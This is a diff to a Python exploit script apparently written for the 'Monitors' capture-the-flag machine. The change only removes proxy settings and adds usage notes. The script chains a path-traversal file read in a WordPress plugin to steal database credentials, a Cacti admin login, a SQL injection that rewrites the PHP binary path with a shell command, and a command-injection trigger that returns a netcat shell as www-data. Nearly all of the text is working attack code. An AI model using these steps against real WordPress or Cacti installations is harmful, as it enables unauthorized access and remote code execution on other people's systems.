@@ -16,6 +16,12 @@ Plan:
 + Return netcat shell.
     GET /cacti/host.php?action=reindex
 """
+"""
+Notes:
++ This script will only give you www-data initial shell. Lateral movement and privesc will need to be done manually. 
++ I have removed proxies from all requests
+"""
+
 # Libraries & imports etc.
 from bs4 import BeautifulSoup
 from multiprocessing import Process
@@ -87,7 +93,7 @@ def getPasswd():
     global cactipassword
     lfi1 = f"/var/www/wordpress/wp-config.php"
     url = f"http://{target}:80/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../{lfi1}"
-    x = session.get(url, proxies=proxies, verify=False)
+    x = session.get(url, verify=False)
     # String to search using regex
     # Search response text using x.text
     # String being search: 
@@ -115,7 +121,7 @@ def getHostname():
     lfi2 = f"/etc/apache2/sites-enabled/000-default.conf"
     url = f"http://{target}:80/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../{lfi2}"
 
-    y = session.get(url, proxies=proxies, verify=False)
+    y = session.get(url, verify=False)
     # String to search using regex
     print(colored("[+] Getting CACTI hostname.", "green"))
     hostname_pattern = r"#\s+Add\s+([a-zA-Z0-9-]+)\.monitors\.htb"
@@ -138,7 +144,7 @@ def getHostname():
 def getCSRF():
     url = f"http://{cactihostname}:80/cacti/index.php"
     # Fetch the page
-    response = session.get(url, proxies=proxies, verify=False)
+    response = session.get(url, verify=False)
 
     # Check if the request was successful
     if response.status_code != 200:
@@ -177,7 +183,7 @@ def doAdminLogin():
         "login_username": f"{cactiuser}", 
         "login_password": f"{cactipassword}"
         }
-    admin_login_request = session.post(url, data=data, proxies=proxies, verify=False)
+    admin_login_request = session.post(url, data=data, verify=False)
     if "Invalid User Name/Password Please Retype" in admin_login_request.text:
         print(colored("[-] Unable to log in. Check your credentials!", "red"))
         os._exit(0) # Exit program
@@ -192,13 +198,13 @@ def doSQLi():
     payload= f"""')+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+set+value='{shell};'+where+name='path_php_binary';--+-"""
     
     url = f"http://{cactihostname}:80/cacti/color.php?action=export&filter=1{payload}"
-    session.get(url, proxies=proxies, verify=False)
+    session.get(url, verify=False)
     print(colored("[+] Payload injected!", "green"))
 
     # Log out
     print(colored("[+] Logging out of Admin.", "green"))
     url2 = f"http://{cactihostname}:80/cacti/logout.php"
-    session.get(url2, proxies=proxies, verify=False)
+    session.get(url2, verify=False)
 
 # Log back in as admin. 
 def doAdminLogin2():
@@ -209,7 +215,7 @@ def doAdminLogin2():
         "login_username": f"{cactiuser}", 
         "login_password": f"{cactipassword}"
         }
-    admin_login_request = session.post(url, data=data, proxies=proxies, verify=False)
+    admin_login_request = session.post(url, data=data, verify=False)
     if "Invalid User Name/Password Please Retype" in admin_login_request.text:
         print(colored("[-] Unable to log in. Check your credentials!", "red"))
         os._exit(0) # Exit program
@@ -221,7 +227,7 @@ def doAdminLogin2():
 def doCmdInj():  
     url = f"http://{cactihostname}:80/cacti/host.php?action=reindex"
     #headers2 = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive", "Upgrade-Insecure-Requests": "1"}
-    session.get(url, proxies=proxies) 
+    session.get(url) 
 
 # Order of functions
 if __name__ == "__main__":
